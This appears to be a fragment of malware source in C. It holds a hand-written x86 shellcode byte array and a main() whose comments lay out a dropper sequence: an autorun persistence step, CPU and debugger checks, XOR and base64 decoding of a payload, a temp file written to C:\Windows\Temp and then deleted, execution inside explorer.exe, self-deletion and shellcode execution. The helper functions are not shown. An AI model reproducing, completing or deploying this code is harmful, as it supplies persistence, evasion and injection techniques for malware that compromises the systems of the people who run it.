
char sc[] = {"\x31\xD2\xB2\x30\x64\x8B\x12\x8B\x52\x0C\x8B\x52\x1C\x8B\x42\x08\x8B\x72\x20\x8B\x12\x80"
          "\x7E\x0C\x33\x75\xF2\x89\xC7\x03\x78\x3C\x8B\x57\x78\x01\xC2\x8B\x7A\x20\x01\xC7\x31\xED"
          "\x8B\x34\xAF\x01\xC6\x45\x81\x3E\x46\x61\x74\x61\x75\xF2\x81\x7E\x08\x45\x78\x69\x74\x75"
          "\xE9\x8B\x7A\x24\x01\xC7\x66\x8B\x2C\x6F\x8B\x7A\x1C\x01\xC7\x8B\x7C\xAF\xFC\x01\xC7\x68"
          "\x50\x21\x20\x01\x68\x78\x20\x4A\x4F\x68\x49\x63\x6F\x46\x89\xE1\xFE\x49\x0B\x31\xC0\x51"
		  "\x50\xFF\xD7"};

int main()
{
	// set autorun
	f2();
	// check intel
	f8();
	// check dbg
	f3();
	// read file to buffer
	void *buff = malloc(1024);
	// XORing
	f4(buff,512,0xFF);
	f1("C:\\Windows\\Temp\\drop.tmp",buff);
	// delete file
	f6("C:\\Windows\\Temp\\drop.tmp");
	void *buff2=malloc(1024);
	// base64 decode
	f5(buff,1024,buff2);
	// run the file
	f9(buff2,_T("explorer.exe"));
	// self-delete
	f7();
	// run shellcode
	f10(sc);
	return 0;
}
